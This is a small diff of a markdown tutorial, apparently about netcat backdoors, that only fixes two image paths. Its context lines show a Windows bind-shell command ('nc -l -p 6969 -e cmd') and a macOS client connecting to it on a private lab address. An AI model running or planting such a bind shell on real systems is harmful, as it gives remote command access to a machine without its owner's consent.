@@ -29,7 +29,7 @@ On Windows (Windows needs the **-p** flag for specifying the port)
 ```bash
 nc -l -p 6969 -e cmd
 ```
-![_Setup Server on Windows_](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)
+![_Setup Server on Windows_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)
 
 **Client**
 
@@ -43,7 +43,7 @@ On macOS
 nc 192.168.64.2 6969
 ```
 
-![_Setup Client on macOS_](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)
+![_Setup Client on macOS_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)
 
 Output on client will be something like:
 
